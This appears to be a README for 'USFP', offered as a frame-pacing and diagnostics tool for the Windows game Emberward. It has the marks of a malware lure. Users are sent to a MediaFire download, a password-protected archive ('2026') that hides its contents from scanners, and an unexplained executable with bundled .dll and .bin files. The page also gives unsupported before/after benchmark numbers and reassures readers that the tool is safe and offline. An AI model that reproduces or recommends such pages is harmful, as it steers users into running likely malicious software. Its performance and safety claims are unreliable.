<div align="center">

# 🎮 Emberward — Performance Notes

**Frame pacing and startup diagnostics for Emberward on Windows.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Emberward is a roguelite tower-defense game centered on maze building with tetromino-shaped walls and specialized towers. It uses Unity and combines strategic planning with active enemy waves. Stable frame delivery matters during dense defense sequences, where visual updates and input timing must remain consistent.

Windows players of Emberward who need measurable diagnostics for frame pacing, launch behavior, and session stability.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2459550/1f08326bcf6cf6f85e95fd63e8a2780266c80e06/ss_1f08326bcf6cf6f85e95fd63e8a2780266c80e06.1920x1080.jpg?t=1790056350" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2459550/7896ee82f91888ab1b130ee866b395e9d04aa9e6/ss_7896ee82f91888ab1b130ee866b395e9d04aa9e6.1920x1080.jpg?t=1790056350" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2459550/7e24034161c568c31d983afd92ce740dfd26150e/ss_7e24034161c568c31d983afd92ce740dfd26150e.1920x1080.jpg?t=1790056350" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, dense late-wave scenes average 34 FPS with 1% lows of 14 FPS.
- On the stated test rig, frame-time spikes above 50 ms occur 8 times during a 20-minute defense run.
- On the stated test rig, first launch spends approximately 90 seconds compiling and loading graphics cache data.

## 🩺 How the toolkit addresses these issues

- **Low average FPS and 1% lows during dense waves** → Frame Rate Helper — adjusts frame delivery behavior; Process Scheduling Helper — optimizes process scheduling.
- **Frame-time spikes above 50 ms** → Frame Timing Helper — stabilizes frame delivery.
- **Extended first-launch shader and cache preparation** → Graphics Cache Utility — manages graphics cache data; Startup Parameter Tool — applies tuned startup parameters.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. Download the latest release from the link in the README.
2. Point the tool to the game's installation folder.
3. Select the game profile from the supported list.
4. Click Apply.
5. On first launch allow the cache to rebuild (1-2 minutes).

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent rendering.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for the selected Emberward profile.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and records frame-time behavior.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling while Emberward is running.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores supported session settings after failures.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and removes stale cache entries.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- crash_reader.dll <- Crash log reader
|-- config.cfg <- User configuration
|-- frame_data.pak <- Display sync data
|-- core.bin <- Core runtime
|-- shader_cache.pak <- Shader cache data
|-- Password 2026.txt <- Password reminder (empty)
|-- fps_module.dll <- FPS module
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.